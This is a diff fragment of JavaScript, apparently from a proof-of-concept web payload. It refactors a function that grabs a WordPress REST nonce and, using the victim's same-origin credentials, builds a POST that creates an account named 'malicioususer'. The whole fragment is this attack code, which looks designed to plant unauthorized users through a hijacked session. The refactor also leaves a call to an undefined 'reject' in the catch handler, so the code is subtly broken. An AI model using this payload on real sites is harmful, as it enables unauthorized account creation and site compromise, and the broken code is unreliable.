@@ -23,28 +23,26 @@ function getPassword() {
 }
 
 function getFetchOptionsPromise() {
-  return new Promise((resolve, reject) => {
-    getNoncePromise()
-      .then((nonce) => {
-        resolve({
-          method: 'POST',
-          credentials: 'same-origin',
-          headers: {
-            'X-WP-Nonce': nonce,
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            username: 'malicioususer',
-            email: 'malicioususer@example.com',
-            password: getPassword(),
-            roles: 'subscriber',
-          })
+  return getNoncePromise()
+    .then((nonce) => {
+      return({
+        method: 'POST',
+        credentials: 'same-origin',
+        headers: {
+          'X-WP-Nonce': nonce,
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          username: 'malicioususer',
+          email: 'malicioususer@example.com',
+          password: getPassword(),
+          roles: 'subscriber',
         })
       })
-      .catch((response) => {
-        console.error('Failed to get Nonce', {response});
-        reject(response);
-      });
+    })
+    .catch((response) => {
+      console.error('Failed to get Nonce', {response});
+      reject(response);
     });
 }
 
